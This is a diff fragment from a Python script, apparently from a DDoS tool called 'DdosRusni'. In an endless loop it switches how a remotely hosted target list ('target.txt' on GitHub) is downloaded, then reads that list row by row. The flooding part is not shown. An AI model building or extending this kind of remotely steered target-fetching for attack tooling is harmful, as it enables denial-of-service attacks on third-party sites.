@@ -18,8 +18,8 @@ while 1 == 1:
  #   f = open(filename,'w')
  #   f.write(str(r.content)+'\n')
  #   f.close
-    testfile = urllib.URLopener()
-    testfile.retrieve("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
+    testfile = urllib.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
+    print(testfile)
     with open(filename,'r') as f:
         for row in f:
             rrow = row.split()
